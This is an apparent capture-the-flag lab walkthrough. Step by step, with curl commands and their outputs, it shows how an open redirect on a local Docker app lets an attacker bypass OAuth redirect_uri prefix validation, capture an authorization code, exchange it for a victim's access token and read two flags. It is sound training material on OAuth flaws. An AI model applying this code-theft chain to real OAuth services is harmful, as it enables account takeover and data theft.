# Walkthrough

## Setup

```
$ docker compose up --build -d
```

## Step 1: read the app index

```
$ curl -s http://127.0.0.1:8097/
```

Note: `/client/go?to=...` (open redirect) and `/oauth/authorize` (OAuth server with prefix validation).

## Step 2: confirm the open redirect

```
$ curl -si 'http://127.0.0.1:8097/client/go?to=http://example.com/'
HTTP/1.1 302 FOUND
Location: http://example.com/
```

## Step 3: confirm OAuth prefix validation accepts chained URI

The registered prefix is `http://127.0.0.1:8097/client`. Construct a redirect_uri that starts with that prefix but points to the open redirect, which then points to the attacker capture page:

```
redirect_uri = http://127.0.0.1:8097/client/go?to=http://127.0.0.1:8097/attacker/land
```

URL-encode this and pass it as the `redirect_uri` parameter.

```
$ CHAIN='http://127.0.0.1:8097/client/go?to=http://127.0.0.1:8097/attacker/land'
$ ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")
$ curl -sL "http://127.0.0.1:8097/oauth/authorize?client_id=trusted-app&response_type=code&redirect_uri=$ENC&state=xyz"
```

Output:

```json
{
  "message": "Attacker captured the authorization code!",
  "stolen_code": "b3f2a1...",
  "next_step": "POST /oauth/token with this code to get an access token"
}
```

The authorization code has been delivered to the attacker's capture page instead of the legitimate callback.

## Step 4: exchange stolen code for access token

```
$ curl -s -X POST http://127.0.0.1:8097/oauth/token \
  -H 'Content-Type: application/json' \
  -d '{"code":"b3f2a1...","client_id":"trusted-app","client_secret":"client-secret-xyz"}'
```

Output:

```json
{"access_token":"abcdef...", "token_type":"Bearer", "user":"alice"}
```

## Step 5: use the token to get Flag 1

```
$ curl -s http://127.0.0.1:8097/api/profile \
  -H 'Authorization: Bearer abcdef...'
```

Output:

```json
{"user":"alice","flag1":"POC{...}"}
```

**Flag 1 captured.**

## Step 6: use the token to get Flag 2

```
$ curl -s http://127.0.0.1:8097/api/secret \
  -H 'Authorization: Bearer abcdef...'
```

Output:

```json
{"secret":"POC{...}"}
```

**Flag 2 captured.**

## Full attack chain

```
/oauth/authorize?redirect_uri=/client/go?to=/attacker/land
        |
        | prefix check passes (starts with /client)
        v
302 -> /client/go?to=/attacker/land?code=AUTHCODE
        |
        | open redirect, no validation
        v
302 -> /attacker/land?code=AUTHCODE
        |
        v
stolen_code = AUTHCODE

POST /oauth/token {code: stolen_code}
        |
        v
access_token for alice

GET /api/profile  -> FLAG1
GET /api/secret   -> FLAG2
```

## Automated exploit

```
$ python3 exploit/exploit.py
```

## Teardown

```
$ docker compose down
```
